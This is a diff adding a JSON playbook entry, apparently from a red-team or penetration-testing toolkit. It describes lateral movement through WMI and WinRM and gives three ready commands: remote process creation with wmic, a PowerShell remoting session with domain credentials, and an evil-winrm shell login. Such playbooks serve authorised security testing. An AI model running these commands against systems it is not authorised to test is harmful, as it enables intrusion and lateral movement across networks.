@@ -1,0 +1,25 @@
+{
+	"name": "Remote Code Execution via WMI & WinRM",
+	"description": "Achieve lateral movement using built-in remote management protocols.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "WMI Command",
+			"command": "wmic /node:TARGET process call create \"cmd /c whoami > C:\\temp\\proof.txt\"",
+			"description": "Execute via WMI."
+		},
+		{
+			"index": 2,
+			"name": "WinRM Session",
+			"command": "Enter-PSSession -ComputerName TARGET -Credential corp\\user",
+			"description": "Interactive PowerShell remoting."
+		},
+		{
+			"index": 3,
+			"name": "External WinRM Shell",
+			"command": "evil-winrm -i TARGET -u user -p password",
+			"description": "Third-party WinRM client."
+		}
+	]
+}
